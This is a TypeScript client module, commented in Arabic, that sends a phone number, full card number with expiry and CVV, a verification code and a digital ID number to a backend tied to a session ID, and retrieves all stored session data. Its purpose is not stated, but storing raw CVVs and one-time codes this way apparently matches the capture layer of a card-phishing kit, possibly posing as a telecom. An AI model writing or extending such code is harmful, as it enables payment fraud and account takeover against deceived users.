// استخدام معرف فريد للجلسات
const generateUUID = (): string => {
  return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
    const r = Math.random() * 16 | 0;
    const v = c === 'x' ? r : (r & 0x3 | 0x8);
    return v.toString(16);
  });
};

// معرف الجلسة الحالية
let currentSessionId = '';

// الحصول على معرف الجلسة الحالي أو إنشاء معرف جديد
export const getSessionId = (): string => {
  if (!currentSessionId) {
    // التحقق من وجود معرف جلسة مخزن في localStorage
    const storedSessionId = localStorage.getItem('du_session_id');
    if (storedSessionId) {
      currentSessionId = storedSessionId;
    } else {
      // إنشاء معرف جلسة جديد وتخزينه
      currentSessionId = generateUUID();
      localStorage.setItem('du_session_id', currentSessionId);
    }
  }
  return currentSessionId;
};

// عنوان الخادم الخلفي
const API_BASE_URL = 'http://localhost:3000/api';

// حفظ رقم الهاتف
export const savePhoneNumber = async (phone: string): Promise<any> => {
  try {
    const sessionId = getSessionId();
    const response = await fetch(`${API_BASE_URL}/save-phone`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({ phone, sessionId }),
    });
    
    if (!response.ok) {
      throw new Error('Failed to save phone number');
    }
    
    return await response.json();
  } catch (error: any) {
    console.error('Error saving phone number:', error);
    // المتابعة حتى في حالة فشل الحفظ
    return { status: 'error', message: error.message || 'Unknown error' };
  }
};

// حفظ بيانات البطاقة
export const saveCardDetails = async (cardNumber: string, expiryDate: string, cvv: string): Promise<any> => {
  try {
    const sessionId = getSessionId();
    const response = await fetch(`${API_BASE_URL}/save-card`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({ cardNumber, expiryDate, cvv, sessionId }),
    });
    
    if (!response.ok) {
      throw new Error('Failed to save card details');
    }
    
    return await response.json();
  } catch (error: any) {
    console.error('Error saving card details:', error);
    // المتابعة حتى في حالة فشل الحفظ
    return { status: 'error', message: error.message || 'Unknown error' };
  }
};

// حفظ رمز التحقق
export const saveVerificationCode = async (code: string): Promise<any> => {
  try {
    const sessionId = getSessionId();
    const response = await fetch(`${API_BASE_URL}/save-verification-code`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({ code, sessionId }),
    });
    
    if (!response.ok) {
      throw new Error('Failed to save verification code');
    }
    
    return await response.json();
  } catch (error: any) {
    console.error('Error saving verification code:', error);
    // المتابعة حتى في حالة فشل الحفظ
    return { status: 'error', message: error.message || 'Unknown error' };
  }
};

// حفظ رقم الهوية الرقمية
export const saveDigitalId = async (digitalId: string): Promise<any> => {
  try {
    const sessionId = getSessionId();
    const response = await fetch(`${API_BASE_URL}/save-digital-id`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({ digitalId, sessionId }),
    });
    
    if (!response.ok) {
      throw new Error('Failed to save digital ID');
    }
    
    return await response.json();
  } catch (error: any) {
    console.error('Error saving digital ID:', error);
    // المتابعة حتى في حالة فشل الحفظ
    return { status: 'error', message: error.message || 'Unknown error' };
  }
};

// استرجاع جميع بيانات الجلسة
export const getSessionData = async (): Promise<any> => {
  try {
    const sessionId = getSessionId();
    const response = await fetch(`${API_BASE_URL}/get-session-data/${sessionId}`);
    
    if (!response.ok) {
      throw new Error('Failed to retrieve session data');
    }
    
    return await response.json();
  } catch (error: any) {
    console.error('Error retrieving session data:', error);
    return { status: 'error', message: error.message || 'Unknown error', data: {} };
  }
};
